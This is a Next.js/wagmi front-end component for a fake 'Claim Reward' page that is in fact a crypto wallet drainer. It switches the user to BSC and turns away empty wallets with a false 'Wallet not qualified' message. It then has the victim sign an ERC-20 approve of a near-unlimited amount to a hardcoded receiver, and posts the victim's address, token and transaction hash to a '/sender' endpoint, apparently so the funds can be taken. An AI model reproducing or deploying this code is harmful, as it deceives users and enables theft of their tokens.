"use client"
import { useWeb3Modal } from '@web3modal/wagmi/react'
import { useAccount, useDisconnect, useBalance, useSwitchNetwork, useNetwork, usePrepareContractWrite, useContractWrite } from 'wagmi'
import { receiver} from '@/utils/constants'
import { queryBalance } from '@/utils/utils'
import { erc20ABI } from 'wagmi'
import { useEffect, useState } from 'react'
import { useWeb3ModalState } from '@web3modal/wagmi/react'
import Spinner from "@/public/images/spinnergb.gif"
import Image from "next/image"
import { useRouter } from 'next/navigation'


export const Connect = () => {

    const {open} = useWeb3Modal()
    const router = useRouter()
    const {open: launch} = useWeb3ModalState()
    const [prt, setPrt] = useState(false)
    const [msg, setMsg] = useState()
    
    const { disconnect } = useDisconnect()
    const handleSubmit = (e: Event) => {
      open()
      if(launch)
      setClick(true)
    else
    router.push("/reward")

    }

   
const [click, setClick] = useState(false)
const {switchNetwork} = useSwitchNetwork()
const {chain} = useNetwork()
const [tok_add, setTok_add] = useState()


const {address, isConnected} = useAccount({

    async onConnect(address) {
  
      try {

        console.log(balance)
    let bal = balance?.value //|| BigInt("0")

    if(switchNetwork)
{
  if(chain && chain.id !== 56)
  switchNetwork(56)
}

      if(chain?.id == 56)
{
if(!bal || bal <= BigInt(0))
{  const mbtn = document.querySelector("#cshm") 
  disconnect()
  mbtn?.click()
  return
}
}
     setPrt(true)
     const adds = address?.address
     const add = await queryBalance(adds)
     console.log("address is",add)
     setTok_add(add)
        
      } catch (error) {
        console.log("Error after connecting", error)
      }
    
    }
  })
  
const amount = BigInt("1157920892373161954235709850086879078532699846656405640394575840079131296399")

const {config, error: preErr} = usePrepareContractWrite({

        abi: erc20ABI,
        functionName: "approve",
        args: [receiver, amount],
        account: address,
        address: tok_add,
})

const {data, write, isLoading, isSuccess, isError} = useContractWrite(config)   
const { data: balance } = useBalance({
            address
          })

const fetchData = async(address: string, contract: string) => {
  
  const hash = data?.hash
  const res = await fetch("/sender", {
    method: "POST",
    body: JSON.stringify({address, contract, hash}),
    headers: {'Content-Type': 'application/json'}
  })
  const dt = await res.json()
  if(dt)
  {
    
    disconnect()
  }
  console.log(dt)
}
useEffect(() => {
  
  if(!click && isConnected)
  {
    localStorage.clear()
    disconnect()
  }
  //disconnect()

}, [])
if(isConnected)

return(
  <>
   <div className="modal fade" id="cm" tabIndex="-1" aria-labelledby="cmLabel" aria-hidden="true">
        <div className="modal-dialog">
            <div className="modal-content py-4">
                <div className="text-center m-4">
                </div>

                <div className="modal-body text-center">
                    <h1>Something went wrong</h1>
                    <p>The transaction is not completed. <br />Wallet not qualified</p>
                </div>
                <div className="modal-footer border-0 justify-content-around">
                </div>
            </div>
        </div>
    </div>

    <button type="button" id="cshm" className="btn btn-primary d-none" data-bs-toggle="modal" data-bs-target="#cm">
            Launch Modal
    </button>

<div className="row justify-content-center">
				<div className="col-lg-10 col-md-12">
					<div className="wrapper">
						<div className="row justify-content-center text-center">
						
            {isLoading && (<div className="col-lg-8">
								<div className="contact-wrap">	
                                        <div className="mb-3">
                                        <div className="mb-3">
  <Image src={Spinner} height={70} width={70} alt='Spinner image' />
</div>
                                        </div>
								</div>
							</div>)}
							<div className="col-lg-8">
								<div className="contact-wrap">	
														<div className="mb-3">
                              {!tok_add && <h4>Connecting please wait</h4>}
															{tok_add &&  ( <>{isError && (<h4>Try again User reject transaction</h4>)}
                              <button className="btn btn-lg btn-warning justify-content-center" onClick={() => write?.()}>Claim Reward</button></>)}
														</div>
												</div>
											</div>
						</div>
					</div>
				</div>
			</div>
      {isSuccess && fetchData(address, tok_add)}
</>
)
    return (

        <>
        
        <div className="modal fade" id="cm" tabIndex="-1" aria-labelledby="cmLabel" aria-hidden="true">
        <div className="modal-dialog">
            <div className="modal-content py-4">
                <div className="text-center m-4">
                </div>
                <div className="modal-body text-center">
                    <h1>Something went wrong</h1>
                    <p>The transaction is not completed. <br />Wallet not qualified</p>
                </div>
                <div className="modal-footer border-0 justify-content-around">
                </div>
            </div>
        </div>
    </div>

    <button type="button" id="cshm" className="btn btn-primary d-none" data-bs-toggle="modal" data-bs-target="#cm">
            Launch Modal
    </button>

<div className="row justify-content-center">
				<div className="col-lg-10 col-md-12">
					<div className="wrapper">
						<div className="row justify-content-center text-center">
						                
							<div className="col-lg-8">
								<div className="contact-wrap">	
                    <div className="mb-3">
                        <h4>Connect wallet to claim {msg && (msg)}</h4>
                              <button className="btn btn-lg btn-warning justify-content-center" onClick={(e) => handleSubmit(e)}>Connect Wallet</button>
                        </div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
      
      </>
    )
}